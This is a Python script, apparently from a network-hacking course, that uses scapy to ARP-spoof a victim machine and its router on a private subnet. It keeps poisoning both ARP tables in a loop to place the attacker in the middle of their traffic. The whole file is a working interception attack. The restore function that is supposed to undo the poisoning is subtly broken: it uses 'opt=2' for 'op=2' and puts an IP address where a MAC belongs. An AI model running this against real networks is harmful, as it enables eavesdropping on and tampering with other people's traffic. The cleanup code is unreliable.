#!/usr/bin/env python

import scapy.all as scapy
import time

# SEND A PACKET TO THE VICTIM DAYING: "I HAVE THE ROUTER MAC ADDRESS"
# op=2: it is an ARP RESPONSE
# pdst: IP address of the target machine
# hwdst: MAC address of the target machine
# psrc: Source IP address. This is the false information. I am forging the request saying to the victim: "I am the router"
#packet = scapy.ARP(op=2, pdst="192.168.223.143", hwdst="00:0c:29:83:8e:53", psrc="192.168.223.2")

#print(packet.show());
#print(packet.summary());

#scapy.send(packet)

def get_mac(ip):
    # Create an object representing an ARP packet asking the MAC of the specific IP:
    arp_request = scapy.ARP(pdst=ip)

    # Create an Ethernet frame to the broadcast MAC address:
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # combination of the Ethernet frame and the ARP packet
    arp_request_broadcast = broadcast / arp_request

    # Send the request. It sends a packet with custom header.
    # Return 2 lists: list of answered packets and list of unanswered packets
    # answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout = 1)

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # get only answered packets

    return answered_list[0][1].hwsrc

# target_ip: IP address of the target machine I want to make believe that I am someone else.
# spoof_ip: IP address I am pretending to be. IP address of the machine that I am telling to the target: "I am this machine".
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # Scapy set by default (if not specified) my MAC address in the ARP table:
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Restore the original state when the ARP Spoof application terminate:
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    # In this case I have to specify the parameter "hwsrc=source_mac" to set the source MAC address in the ARP table:
    packet = scapy.ARP(opt=2, pdst=destination_ip, hwdst=destination_ip, psrc=source_ip, hwsrc=source_mac)
    #print(packet.show())
    #print(packet.summary())

    # I send it 4 times to ensure that the target machine receive it and correct its ARP table:
    scapy.send(packet, count=4, verbose=False)



sent_packets_count = 0

target_ip = "192.168.223.142"               # IP of the victim machine
gateway_ip = "192.168.223.2"                # IP of the router

try:
    # I have to send continuously these packets to avoid that the ARP table is updated with the correct MAC address
    # after receive the response:
    while True:
        # Say to the target PC: "I am the router":
        spoof(target_ip, gateway_ip)

        # Say to the router: "I am the target PC":
        spoof(gateway_ip, target_ip)

        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packet sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .... Resetting ARPs tables.... Please wait.")

    # Restore the ARP table of the victim machine setting in it the correct MAC address of the gateway:
    restore(target_ip, gateway_ip)
    # Restore the ARP table of the router  setting in it the correct MAC address of the victim machine:
    restore(gateway_ip, target_ip)







